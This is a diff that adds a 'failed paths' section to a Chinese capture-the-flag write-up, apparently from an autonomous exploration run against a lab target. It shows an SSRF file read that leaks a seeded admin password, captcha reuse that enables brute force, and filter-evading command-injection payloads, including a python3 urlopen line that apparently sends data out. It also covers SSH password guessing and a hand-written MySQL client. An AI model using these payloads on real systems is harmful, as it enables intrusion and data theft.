@@ -358,3 +358,77 @@ dashboard 的「系统核心密钥」就是最后一面 flag（`matched_flag_ind
 5. **启动脚本是最便宜的意图泄露**：日志权限、SUID、默认口令、flag 路径，通常都在 `entrypoint.sh` 里成对出现。
 6. **SSH 盲爆有吞吐上限**：每失败一次约 5 秒，超过几百个候选就该停下来找凭据，而不是加大并发。
 7. **多 flag 题要在一个容器生命周期内走完**：中途 close 会重生成实例，前面的 shell 和上传物全部消失。
+
+---
+
+## 补充：2026-10-27 本轮自主探索的失败路径
+
+### 1. 顺序反了：先爆破，后读源码
+
+后台 `admin` 的口令我先用字典跑了一遍，`NOFIND`：
+
+| 尝试 | 规模 | 结果 |
+| --- | --- | --- |
+| `/admin/login.php` + 10 200 条字典 | 10 200 | 全部 `用户名或密码错误` |
+
+随后用 `proxy.php?url=file:///docker-entrypoint-initdb.d/init.sql` 读到初始化 SQL：
+
+```sql
+INSERT INTO admins (username, password, realname, email, role) VALUES
+('admin', MD5('1qaz@WSX'), '系统管理员', 'admin@deeptech.com', 'admin');
+```
+
+口令就明文写在文件里（`MD5('1qaz@WSX')` 反过来就是 `1qaz@WSX`）。
+
+**该早做的事**：已经有 `file://` 任意文件读时，先读
+`/docker-entrypoint-initdb.d/*.sql`、`/app/*.py`、`/entrypoint.sh`，再考虑爆破。
+顺序反了，成本差三个数量级。
+
+### 2. 验证码：先想绕过，其实读图最快
+
+| 尝试 | 结果 | 判据 |
+| --- | --- | --- |
+| 不带 `captcha` / 空值 | `验证码错误` | 服务端强校验 |
+| 复用上一次的 captcha | **通过** | 校验后没有 unset session 里的值 |
+| `GET /captcha.php` 存图人工识别 | 通过（7653 / 9161 / 0745） | 4 位数字，无扭曲 |
+
+这不是「绕过」而是「没必要绕」。但复用不失效这一点值得记：它让口令爆破变得可行
+（不必每轮读图），反过来也说明爆破门槛很低——只是本例用不上，口令已经在 `init.sql` 里。
+
+### 3. 命令注入：先确认「哪些字符被拦」再选通道
+
+OA 的 `tools.php` 是 `shell_exec("ping -c 3 -W 3 " . $host)`。
+
+| payload | 结果 | 判据 |
+| --- | --- | --- |
+| `127.0.0.1$(id)` | 回显 `ping: groups=33(www-data): ...` | 注入生效，ping 把参数拆词后报错 |
+| ``127.0.0.1`id` `` / `;id` / `\|id` | `安全警告：检测到非法字符` | 反引号、分号、竖线被拦 |
+| `$(cat /challenge/flag4.txt\|base64 -w0)` | `安全警告` | 含 `\|` |
+| `$(base64</challenge/flag4.txt)` | `安全警告：发现危险字符 <` | 重定向符被单独拦 |
+| `$(python3 -c "…urlopen(…b64…).read()")` | 成功 | 只剩 `$()` 可用，用 `read()` 不落盘 |
+
+**该早做的事**：先把候选字符逐个试一遍（一次请求一个），画出黑名单，再决定用哪种包装。
+本例只有 `$()` 活着，所以必须走「命令替换 + 不落盘的读取」。
+
+### 4. 从容器里做 SSH：链路通但客户端缺
+
+文件服务器 22 从容器里可达，容器没有 `ssh`/`sshpass`。
+
+| 现象 | 原因 | 处理 |
+| --- | --- | --- |
+| `Crypt_RC4 not found` | phpseclib 相对 include 找不到 `Crypt/*` | `set_include_path('/tmp/psl')` |
+| 60 个候选全失败 | 字典里没有 `Weaver@2023` | 「产品名 + 年份 + 符号」这个形状没进字典 |
+
+后一条是本轮最典型的盲区：字典覆盖面不等于口令空间，产品名相关的组合要靠读源码/hint 得到，
+不该指望通用字典。
+
+### 5. 手写 MySQL 协议：两个能从报错直接读出来的卡点
+
+web 容器只有 `mysqlnd`，没有 `mysqli`、`pymysql`、`python3`，只能手写协议（Perl）。
+
+| 现象 | 原因 | 处理 |
+| --- | --- | --- |
+| `AUTHFAIL code=254`，后跟 `mysql_native_password` | 服务端发 `AuthSwitchRequest`（0xFE），第一版没处理 | 解析 0xFE，用新 salt 重算 `sha1` 三连，序号 3 重发 |
+| `QERR 3D000 No database selected` | 握手包没带 `CLIENT_CONNECT_WITH_DB` | 库里写全限定名：`SELECT * FROM corporate.secrets` |
+
+这两条都不是凭据错误，只是协议实现不全。如果按「连不上就换口令」的思路走，会一直判成口令错。
